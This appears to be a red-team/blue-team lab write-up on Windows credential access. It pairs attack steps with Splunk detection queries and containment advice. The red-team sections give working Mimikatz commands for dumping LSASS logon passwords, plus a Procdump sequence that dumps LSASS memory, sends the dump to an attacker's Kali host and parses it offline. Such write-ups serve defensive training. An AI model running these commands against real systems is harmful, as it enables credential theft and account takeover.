🚩 **Phase 4: Credential Access — Live Extraction and Offline Dumping**

## Overview

**Objective**  
Extract credential material from the compromised host for reuse in later attack phases. This phase demonstrates both live credential dumping and stealth offline memory extraction.

**MITRE ATT&CK Mapping**
- **T1003.001:** LSASS Memory  

Credential access marks the transition from system compromise to identity compromise.

---

## Phase 4a — Online Credential Extraction (Mimikatz)

**Scenario**  
The attacker interacts directly with LSASS memory through an active implant to retrieve live logon credentials.

---

### Attack Simulation (Red Team)

Credential dumping is executed from a SYSTEM-level session.  
Privilege validation confirms SeDebugPrivilege is enabled prior to memory access.

**Command**
```bash
getprivs
mimikatz "privilege::debug" "sekurlsa::logonpasswords"
```

<p align="center">
  <img src="images/systemproof.png">
</p>
<p align="center">
  <em>Figure 4.1: SYSTEM-level session confirmed and SeDebugPrivilege enabled</em>
</p>

<p align="center">
  <img src="images/offline.png">
</p>
<p align="center">
  <em>Figure 4.2: Credentials extracted directly from LSASS memory</em>
</p>

Live credential material is obtained without writing a dump file to disk.

---

### Detection & Hunting (Blue Team — Splunk)

**Detection Logic**  
Unauthorized processes requesting handle access to LSASS strongly indicate credential dumping.

**Query**
```spl
index=windows EventCode=10 
TargetImage="C:\\Windows\\system32\\lsass.exe" 
| stats count by _time, SourceImage, GrantedAccess, dest
```

**[Screenshot required]**

**Assessment**  
Non-system binaries accessing LSASS memory represent high-confidence credential theft behavior.

---

## Phase 4b — Offline Credential Dumping (Procdump)

**Scenario**  
To reduce live detection risk, a signed Microsoft Sysinternals utility is used to dump LSASS memory to disk for offline analysis.

This technique blends malicious behavior with legitimate administrative tooling.

---

### Attack Simulation (Red Team)

The Sysinternals Procdump tool is retrieved by the attacker and discreetly uploaded to the victim host. The utility is then used to create a memory dump for off-host parsing.

<p align="center">
  <img src="images/wget.png">
</p>
<p align="center">
  <em>Figure 4.3: Procdump retrieved and staged from the attacker environment</em>
</p>

**Command**
```bash
C:\Windows\Temp\procdump64.exe -ma lsass.exe C:\Windows\Temp\lsass.dmp /accepteula
download C:\Windows\Temp\lsass.dmp /home/kali/lsass.dmp
wine mimikatz.exe
sekurlsa::minidump /home/kali/lsass.dmp
sekurlsa::logonpasswords
```

<p align="center">
  <img src="images/procdump.png">
</p>
<p align="center">
  <em>Figure 4.4: Procdump executing against LSASS</em>
</p>

<p align="center">
  <img src="images/download.png">
</p>
<p align="center">
  <em>Figure 4.5: Memory dump exfiltrated to attacker system</em>
</p>

<p align="center">
  <img src="images/wine.png">
</p>
<p align="center">
  <em>Figure 4.6: Offline credential parsing using Mimikatz</em>
</p>

Credential parsing occurs off-host to minimize endpoint visibility.

---

### Detection & Hunting (Blue Team — Splunk)

**Detection Logic**  
Execution of Procdump targeting LSASS memory is a high-fidelity credential theft signal.

**Query**
```spl
index=windows EventCode=1 
Image="*\\procdump*.exe" 
CommandLine="*-ma lsass.exe*"
| table _time, User, CommandLine, ParentImage
```

**[Screenshot required]**

**Assessment**  
Use of legitimate administrative tooling against LSASS is strongly associated with credential exfiltration.

---

## SOC Decision & Response

**Status:** CONFIRMED CREDENTIAL THEFT ACTIVITY

**Immediate Containment**
- Reset exposed credentials  
- Isolate affected host  
- Remove credential dump artifacts  
- Review authentication logs for suspicious reuse  

---

## Key Takeaway

Credential access was achieved through both live and offline memory extraction:

- Direct LSASS credential dumping  
- Stealth offline parsing workflow  

The attacker now possesses reusable authentication material. Detection relies on monitoring LSASS access patterns and abuse of administrative tools rather than traditional malware signatures.
